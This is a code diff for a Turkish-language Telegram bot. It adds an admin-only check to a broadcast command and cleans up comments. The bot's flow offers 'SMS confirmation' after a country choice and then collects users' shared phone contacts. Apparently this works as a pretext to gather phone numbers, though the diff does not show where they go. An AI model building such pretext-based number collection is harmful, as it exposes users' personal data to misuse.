@@ -2,9 +2,7 @@ from telegram import (
     Update,
     KeyboardButton,
     ReplyKeyboardMarkup,
-    Contact,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup
+    Contact
 )
 from telegram.ext import (
     ApplicationBuilder,
@@ -18,14 +16,15 @@ from datetime import datetime
 import pytz
 import os
 
+# ENV DEĞERLERİ
 TOKEN = os.getenv("BOT_TOKEN")
 KANAL_ID = os.getenv("KANAL_ID")
+ADMIN_ID = int(os.getenv("ADMIN_ID"))   # <-- Railway .env içine ekleniyor
+
 TIMEZONE = pytz.timezone("Europe/Istanbul")
 
-# --------------------------
-# START ATANLARI KAYDETME
-# --------------------------
-kullanicilar = set()   # <--- EKLENEN KISIM
+# KULLANICILARI KAYDETME
+kullanicilar = set()
 kullanici_durum = {}
 
 ulkeler = [
@@ -39,9 +38,7 @@ ulkeler = [
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-
-    # START ATANLARI KAYDET
-    kullanicilar.add(user.id)   # <--- EKLENDİ
+    kullanicilar.add(user.id)  # START ATAN HERKES KAYDEDİLİR
 
     ad = user.username or user.first_name
     await update.message.reply_text(
@@ -56,6 +53,7 @@ async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
     secilen = random.sample(ulkeler, 15)
     butonlar = [[KeyboardButton(f"{b} {i}")] for i, b in secilen]
     butonlar.append([KeyboardButton("🔙 Geri Dön")])
+
     await update.message.reply_text(
         "Bir ülke seç:",
         reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
@@ -67,8 +65,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if text == "💬 SMS Onayla":
         await sms_onayla(update, context)
+
     elif text == "🔙 Geri Dön":
         await start(update, context)
+
     elif any(text == f"{b} {i}" for i, b in ulkeler):
         kullanici_durum[uid] = True
         await update.message.reply_text(
@@ -100,10 +100,16 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Alındı ✅")
     kullanici_durum[uid] = False
 
-# -----------------------------------
-# 🔥 /duyuru KOMUTU EKLENDİ
-# -----------------------------------
+# ------------------------------
+# 🔥 DUYURU KOMUTU + ADMIN KONTROL
+# ------------------------------
 async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    # SADECE ADMIN KULLANABİLİR
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Bu komutu sadece admin kullanabilir.")
+        return
+
     if not context.args:
         await update.message.reply_text("Kullanım: /duyuru mesajınız")
         return
@@ -118,13 +124,13 @@ async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             pass
 
-    await update.message.reply_text(f"📢 Duyuru gönderildi: {sayi} kullanıcı")
+    await update.message.reply_text(f"📢 Duyuru gönderildi ({sayi} kişiye).")
 
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("duyuru", duyuru))  # <-- EKLENDİ
+    app.add_handler(CommandHandler("duyuru", duyuru))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
